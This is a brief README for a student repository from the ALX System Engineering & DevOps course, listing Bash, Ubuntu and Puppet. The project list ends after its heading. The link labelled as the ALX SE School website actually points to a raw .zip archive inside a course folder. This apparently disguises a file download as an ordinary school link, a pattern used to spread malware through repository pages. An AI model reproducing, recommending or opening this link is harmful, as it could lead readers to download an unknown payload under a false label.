# System engineering & Devops
Module of **System engineering** and **Devops**, carried out during **Full Stack Software Engineering studies** at **[ALX SE School](https://raw.githubusercontent.com/LeboMeje/alx-system_engineering-devops/main/0x01-shell_permissions/alx-system-devops-engineering-2.8.zip)**.
## Technologies
* Scripts written in Bash 4.8.4
* Tested on Ubuntu 20.04 LTS
* Puppet 3.8

## Projects
All of the following folders are projects done during the studies:
